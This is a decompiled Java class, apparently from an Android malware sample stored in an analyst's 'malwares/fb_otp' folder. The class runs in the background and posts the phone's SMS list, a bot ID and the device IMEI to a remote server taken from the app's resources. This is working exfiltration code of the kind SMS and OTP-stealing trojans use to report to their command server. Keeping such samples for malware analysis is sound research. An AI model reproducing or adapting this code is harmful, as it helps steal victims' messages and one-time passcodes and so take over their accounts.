import android.content.Context;
import com.soft360.iService.AService;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class dV
  implements Runnable
{
  dV(dU paramdU) {}
  
  public final void run()
  {
    try
    {
      Object localObject1 = this.a;
      Object localObject2 = dU.d();
      localObject1 = new DefaultHttpClient();
      ((HttpClient)localObject1).getParams().setParameter("http.protocol.content-charset", "UTF-8");
      Object localObject3 = this.a.a(AService.jdField_a_of_type_AndroidContentContext.getString(2131165194));
      localObject3 = new HttpPost(this.a.a(AService.jdField_a_of_type_Int) + (String)localObject3);
      ArrayList localArrayList = new ArrayList();
      localArrayList.add(new BasicNameValuePair("sms_list", (String)localObject2));
      localArrayList.add(new BasicNameValuePair("bot_id", this.a.b()));
      localObject2 = this.a;
      localArrayList.add(new BasicNameValuePair("imei", dU.a()));
      ((HttpPost)localObject3).setEntity(new UrlEncodedFormEntity(localArrayList, "UTF-8"));
      ((HttpClient)localObject1).execute((HttpUriRequest)localObject3);
      return;
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
      return;
    }
    catch (ClientProtocolException localClientProtocolException) {}
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dV.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */